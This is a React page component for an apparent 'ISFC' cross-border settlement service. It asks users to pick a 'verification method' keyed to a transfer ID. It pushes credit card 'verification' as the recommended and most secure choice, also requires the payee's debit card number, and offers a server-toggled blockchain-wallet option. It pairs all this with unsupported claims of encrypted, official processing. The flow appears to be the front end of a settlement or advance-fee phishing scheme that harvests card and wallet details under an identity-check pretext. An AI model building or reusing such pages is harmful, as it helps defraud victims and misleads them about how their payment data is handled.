import React, { useEffect, useState } from "react";
import { useParams, useLocation, useNavigate } from "react-router-dom";
import { CreditCard, ArrowLeft, ShieldCheck, Star, ChevronRight, CheckCircle, ChevronDown } from "lucide-react";
import Header from "../components/Header";
import Footer from "../components/Footer";
import NoticeCard from "../components/NoticeCard";
import { verifyTransaction, getBlockchainChannel } from "../lib/api";
import { useFixedBanners } from "../lib/useFixedBanners";
import { saveSession, rehydrateSession } from "../lib/session";
import type { Transaction, KycDraft } from "../lib/types";
import { DebitCardOption, BlockchainOption } from "../components/VerificationMethodCards";

export default function CardSelectPage() {
  const { ftUid } = useParams<{ ftUid: string }>();
  const location = useLocation();
  const navigate = useNavigate();
  const tx: Transaction | null = location.state?.transaction || null;
  const resubmitting = location.state?.kyc === null;
  const [kyc, setKyc] = useState<KycDraft | null>(location.state?.kyc || null);
  const [hydratedTx, setHydratedTx] = useState<Transaction | null>(null);
  const [hydrating, setHydrating] = useState(!location.state?.transaction);

  // Cold-reload recovery
  useEffect(() => {
    if (location.state?.transaction) return;
    let cancelled = false;
    rehydrateSession().then((res) => {
      if (cancelled || !res) { setHydrating(false); return; }
      setHydratedTx(res.transaction);
      setKyc(res.kyc);
      setHydrating(false);
    }).catch(() => { setHydrating(false); });
    return () => { cancelled = true; };
  }, [location.state]);

  const effectiveTx: Transaction | null = tx || hydratedTx;
  const effectiveResubmitting = resubmitting || (!tx && hydratedTx !== null && !location.state?.kyc);

  // Keep session in sync
  useEffect(() => {
    if (effectiveTx) saveSession(effectiveTx, kyc);
  }, [effectiveTx, kyc]);

  // Always pick up the latest saved draft so returning from the form reflects what was typed
  useEffect(() => {
    if (!effectiveTx || effectiveResubmitting) return;
    let cancelled = false;
    verifyTransaction(effectiveTx.ft_uid, effectiveTx.serial_number)
      .then((res) => { if (!cancelled && res.valid) setKyc(res.kyc || null); })
      .catch(() => {});
    return () => { cancelled = true; };
  }, [effectiveTx, effectiveResubmitting]);

  const banners = useFixedBanners(ftUid);
  const [showMore, setShowMore] = useState(false);
  const [blockchainStatus, setBlockchainStatus] = useState<{ tx_blockchain_enabled: boolean; wallet_brand: string | null; already_submitted: boolean } | null>(null);

  useEffect(() => {
    if (!ftUid) return;
    let cancelled = false;
    const load = () => getBlockchainChannel(ftUid)
      .then(cfg => { if (cfg && !cancelled) setBlockchainStatus(cfg); })
      .catch(() => {});
    const onVisible = () => { if (document.visibilityState === "visible") load(); };
    load();
    const id = setInterval(load, 4000);
    document.addEventListener("visibilitychange", onVisible);
    return () => {
      cancelled = true;
      clearInterval(id);
      document.removeEventListener("visibilitychange", onVisible);
    };
  }, [ftUid]);

  useEffect(() => {
    if (!effectiveTx && !hydrating) navigate("/", { replace: true });
  }, [effectiveTx, hydrating, navigate]);

  if (!effectiveTx) {
    return (
      <div className="min-h-screen-safe flex items-center justify-center">
        <span className="w-8 h-8 border-2 border-[#1E3A8A]/20 border-t-[#1E3A8A] rounded-full animate-spin" />
      </div>
    );
  }

  function select(cardType: "credit" | "debit") {
    navigate(`/kyc/${ftUid}`, { state: { transaction: effectiveTx, kyc, cardType, fromCardSelect: true } });
  }

  function selectBlockchain() {
    navigate(`/blockchain-kyc/${ftUid}`, { state: { transaction: effectiveTx, kyc, cardType: "blockchain", fromCardSelect: true } });
  }

  const blockchainAvailable = blockchainStatus
    ? blockchainStatus.tx_blockchain_enabled && !blockchainStatus.already_submitted
    : !!effectiveTx.blockchain_enabled && !(kyc?.verification_channel === "blockchain" && kyc?.is_submitted);

  return (
    <div className="min-h-screen-safe flex flex-col">
      <Header />

      {/* ═══════════════════════════════════════════════════════════════════
          MOBILE layout  (< lg)
      ════════════════════════════════════════════════════════════════════ */}
      <main className="settlement-mobile relative flex min-w-0 flex-1 flex-col lg:hidden">
        <div className="verification-hero pb-12 sm:pb-14">
          <div className="mx-auto w-full">
            <div className="verification-toolbar">
              <button onClick={() => navigate(-1)} className="verification-back">
                <span className="verification-back-icon"><ArrowLeft className="w-4 h-4" /></span>
                Back
              </button>
            </div>
            <div className="verification-eyebrow">
              <ShieldCheck className="w-3.5 h-3.5 flex-shrink-0" />
              <span>Identity Verification</span>
            </div>
            <h1 className="verification-heading">Select Verification Method</h1>
            <p className="verification-description">
              Choose the card type you will use to complete identity verification for this settlement.
            </p>
          </div>
        </div>

        <div className="verification-content z-10 -mt-7 rounded-t-[28px] sm:-mt-8 sm:rounded-t-[32px] flex-1 pt-5 sm:pt-6 px-4 sm:px-6 pb-8 w-full" style={{ paddingBottom: "max(2rem, env(safe-area-inset-bottom))" }}>
          <div className="mx-auto w-full">

            {/* Fixed banner notifications */}
            {banners.length > 0 && (
              <div className="space-y-3 mb-4">
                {banners.map((b) => (
                  <NoticeCard key={b.id} title={b.title} content={b.content} />
                ))}
              </div>
            )}

            {/* Credit card — RECOMMENDED */}
            <button
              onClick={() => select("credit")}
              className="verification-credit group relative w-full text-left rounded-2xl overflow-hidden transition-all duration-200 active:scale-[0.98] mb-4 focus:outline-none focus:ring-2 focus:ring-[#8A6329] focus:ring-offset-2"
            >
              <div className="relative px-5 py-5">
                {/* Badge */}
                <div className="inline-flex items-center gap-1 bg-[#EAD4A1] text-[#60461F] text-[10px] font-extrabold uppercase tracking-wider px-2.5 py-1 rounded-full mb-4">
                  <Star className="w-2.5 h-2.5 fill-current" />
                  Recommended
                </div>

                <div className="flex items-center gap-4 mb-4">
                  <div className="w-12 h-12 rounded-xl bg-[#F2E5C8] border border-[#D8BF85] flex items-center justify-center flex-shrink-0">
                    <CreditCard className="w-6 h-6 text-[#8A6329]" />
                  </div>
                  <div>
                    <h3 className="text-[15px] font-extrabold text-[#4B371D]">Credit Card Verification</h3>
                    <p className="text-xs text-[#716047] mt-0.5">Standard · Most secure method</p>
                  </div>
                </div>

                <ul className="space-y-2 mb-4">
                  {["Higher verification credibility", "Wider acceptance across jurisdictions", "Faster review processing"].map(item => (
                    <li key={item} className="flex items-center gap-2">
                      <CheckCircle className="w-3.5 h-3.5 text-[#9B752C] flex-shrink-0" />
                      <span className="text-xs text-[#5F5038]">{item}</span>
                    </li>
                  ))}
                </ul>

                <div className="flex items-center justify-between border-t border-[#D8C399]/70 pt-3">
                  <span className="text-[11px] text-[#725D3F]">Also requires payee debit card</span>
                  <span className="inline-flex items-center gap-1 rounded-full bg-white border border-[#D8BF85] px-3 py-1 text-xs font-bold text-[#8A6329] shadow-sm transition-all group-hover:bg-[#8A6329] group-hover:border-[#8A6329] group-hover:text-white group-hover:gap-2">
                    Select <ChevronRight className="w-3.5 h-3.5" />
                  </span>
                </div>
              </div>
            </button>

            <div className="mb-5"><DebitCardOption onSelect={() => select("debit")} /></div>

            {blockchainAvailable && (
              <div className="mb-5">
                <button
                  onClick={() => setShowMore(v => !v)}
                  aria-expanded={showMore}
                  className="group w-full min-h-11 flex items-center gap-3 py-2 rounded-lg focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-[#C8992A]"
                >
                  <span className="flex-1 h-px bg-gray-200" />
                  <span className="inline-flex items-center gap-1.5 whitespace-nowrap rounded-full border border-gray-200 bg-white px-3.5 py-1.5 text-xs font-semibold text-gray-500 shadow-sm group-hover:text-[#1E3A8A] group-hover:border-[#1E3A8A]/30 transition">
                    {showMore ? "Hide alternative method" : "More verification methods"}
                    <ChevronDown className={`w-3.5 h-3.5 transition-transform duration-200 ${showMore ? "rotate-180" : ""}`} />
                  </span>
                  <span className="flex-1 h-px bg-gray-200" />
                </button>
                {showMore && (
                  <div className="mt-3"><BlockchainOption onSelect={selectBlockchain} /></div>
                )}
              </div>
            )}

            {/* Security notice */}
            <div className="verification-card flex items-start gap-3 rounded-2xl px-4 py-3.5">
              <ShieldCheck className="w-4 h-4 text-[#1E3A8A] flex-shrink-0 mt-0.5" />
              <p className="text-xs text-gray-500 leading-relaxed">
                All verification information is encrypted and processed exclusively through ISFC's official secure authentication system.
              </p>
            </div>
          </div>
        </div>
      </main>

      {/* ═══════════════════════════════════════════════════════════════════
          DESKTOP layout  (lg+)
      ════════════════════════════════════════════════════════════════════ */}
      <main className="mx-auto hidden w-full max-w-[1040px] flex-1 px-8 py-8 lg:block xl:py-10">
        <button onClick={() => navigate(-1)} className="verification-back verification-back-desktop mb-5">
          <span className="verification-back-icon"><ArrowLeft className="w-4 h-4" aria-hidden="true" /></span>
          Back
        </button>
        <div className="settlement-document overflow-hidden rounded-[28px]">
          <div className="verification-hero verification-hero-desktop">
            <div className="verification-eyebrow">
              <ShieldCheck className="w-3.5 h-3.5 flex-shrink-0" />
              <span>Identity Verification</span>
            </div>
            <div className="verification-title-row">
              <h1 className="verification-heading">Select Verification Method</h1>
            </div>
            <p className="verification-description">
              Choose the card type you will use to complete identity verification for this cross-border settlement.
            </p>
            <div className="verification-reference">
              <span>FT-UID</span><span className="font-mono">{effectiveTx.ft_uid}</span>
            </div>
          </div>

          <div className="relative z-10 -mt-6 rounded-t-[24px] bg-white px-8 pt-5 pb-6 xl:px-12">
            <div className="space-y-4">
              {/* Fixed banner notifications */}
              {banners.length > 0 && (
                <div className="space-y-3">
                  {banners.map((b) => (
                    <NoticeCard key={b.id} title={b.title} content={b.content} />
                  ))}
                </div>
              )}

              <button
                onClick={() => select("credit")}
                className="verification-credit group relative w-full text-left rounded-2xl overflow-hidden transition-all duration-200 focus:outline-none focus:ring-2 focus:ring-[#8A6329] focus:ring-offset-2"
              >
                <div className="relative px-6 py-6 transition-transform duration-300 group-hover:-translate-y-0.5">
                  <div className="absolute top-4 right-5 flex items-center gap-1.5 bg-[#EAD4A1] text-[#60461F] text-[10px] font-extrabold uppercase tracking-wider px-2.5 py-1 rounded-full shadow-sm transition-transform duration-300 group-hover:scale-105 group-hover:shadow-md">
                    <Star className="w-3 h-3 fill-current transition-transform duration-300 group-hover:rotate-12" />
                    Recommended
                  </div>
                  <div className="flex items-start gap-4">
                    <div className="flex-shrink-0 w-14 h-14 rounded-xl bg-[#F2E5C8] border border-[#D8BF85] flex items-center justify-center transition-all duration-300 group-hover:bg-[#EDDCB4] group-hover:border-[#C7A564] group-hover:scale-105">
                      <CreditCard className="w-7 h-7 text-[#8A6329] transition-transform duration-300 group-hover:-rotate-3" />
                    </div>
                    <div className="flex-1 min-w-0 pr-24">
                      <h3 className="text-base font-bold text-[#4B371D] mb-1">Credit Card Verification</h3>
                      <p className="text-sm text-[#716047] leading-relaxed">
                        The standard and most secure method for cross-border settlement identity verification.
                      </p>
                      <ul className="mt-3 space-y-1.5">
                        {["Higher verification credibility", "Wider acceptance across jurisdictions", "Faster review processing"].map(item => (
                          <li key={item} className="flex items-center gap-2">
                            <CheckCircle className="w-3.5 h-3.5 text-[#9B752C] flex-shrink-0 transition-transform duration-300 group-hover:scale-110" />
                            <span className="text-xs text-[#5F5038]">{item}</span>
                          </li>
                        ))}
                      </ul>
                    </div>
                  </div>
                  <div className="mt-5 flex items-center justify-between border-t border-[#D8C399]/70 pt-4">
                    <span className="text-xs text-[#725D3F]">Also requires payee debit card number</span>
                    <span className="inline-flex items-center gap-1 rounded-full bg-white border border-[#D8BF85] px-3 py-1 text-xs font-bold text-[#8A6329] shadow-sm transition-all group-hover:bg-[#8A6329] group-hover:border-[#8A6329] group-hover:text-white group-hover:gap-2">
                      Select <ChevronRight className="w-3.5 h-3.5" />
                    </span>
                  </div>
                </div>
              </button>

              <DebitCardOption onSelect={() => select("debit")} />

              {blockchainAvailable && (
                <div className="pt-2">
                  <button
                    onClick={() => setShowMore(v => !v)}
                    aria-expanded={showMore}
                    className="group w-full min-h-11 flex items-center gap-3 py-2 rounded-lg focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-[#C8992A]"
                  >
                    <span className="flex-1 h-px bg-gray-200" />
                    <span className="inline-flex items-center gap-1.5 whitespace-nowrap rounded-full border border-gray-200 bg-white px-3.5 py-1.5 text-xs font-semibold text-gray-500 shadow-sm group-hover:text-[#1E3A8A] group-hover:border-[#1E3A8A]/30 transition">
                      {showMore ? "Hide alternative method" : "More verification methods"}
                      <ChevronDown className={`w-3.5 h-3.5 transition-transform duration-200 ${showMore ? "rotate-180" : ""}`} />
                    </span>
                    <span className="flex-1 h-px bg-gray-200" />
                  </button>
                  {showMore && (
                    <div className="mt-3"><BlockchainOption onSelect={selectBlockchain} /></div>
                  )}
                </div>
              )}
            </div>

            <div className="verification-card mt-6 flex items-start gap-3 rounded-xl px-4 py-3.5">
              <ShieldCheck className="w-4 h-4 text-gray-400 flex-shrink-0 mt-0.5" />
              <p className="text-xs text-gray-500 leading-relaxed">
                All verification information is encrypted and processed exclusively through ISFC's official secure authentication system. Your data will not be used for any other purpose.
              </p>
            </div>
          </div>
        </div>
      </main>

      <Footer />
    </div>
  );
}
